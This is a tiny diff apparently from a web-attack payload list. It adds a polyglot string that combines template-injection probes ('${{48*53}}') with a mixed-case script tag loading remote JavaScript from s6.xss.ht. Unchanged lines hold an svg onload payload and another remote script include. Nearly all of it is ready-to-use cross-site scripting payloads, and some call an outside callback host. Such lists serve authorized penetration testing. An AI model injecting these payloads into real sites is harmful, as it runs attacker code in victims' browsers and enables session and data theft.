@@ -1,4 +1,5 @@
 '"><svg/onload=prompt(5);>{{7*7}}
+${{48*53}}`'";--><sCRIpt sRc=//s6.xss.ht></sCRIpt>
 
 "><script/src=//s6.xss.ht></script>
 
